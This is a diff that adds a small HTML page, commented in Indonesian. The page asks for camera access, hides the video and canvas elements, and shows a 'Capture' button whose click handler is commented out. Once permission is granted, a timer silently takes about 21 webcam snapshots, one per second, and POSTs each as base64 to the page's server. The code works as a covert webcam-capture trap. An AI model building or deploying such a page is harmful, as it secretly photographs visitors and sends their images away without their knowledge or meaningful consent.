@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Images</title>
+</head>
+<body>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <video id="video" style="display: none;" autoplay></video>
+    <button id="btn">Capture</button>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('btn');
+        var a = 0
+
+        if ("mediaDevices" in navigator) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(error => {
+                    console.error('Error accessing the camera:', error);
+                });
+
+            var potretGambar = setInterval(()=>{
+                     //  captureButton.addEventListener('click', () => {
+                if (a <= 20){
+                    a++
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                   // Mengambil data gambar dari canvas dalam format base64
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // Kirim data gambar ke server menggunakan fetch
+                    fetch('camera', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Data berhasil dikirim ke server:', data);
+                    })
+                    .catch(error => {
+                        console.error('Ada kesalahan:', error);
+                    });
+                }else{
+                    clearInterval(potretGambar) //hentikan setInterfal
+                }
+         //   });
+            },1000)
+        } else {
+            console.error("mediaDevices tidak didukung oleh browser ini.");
+        }
+    </script>
+</body>
+</html>
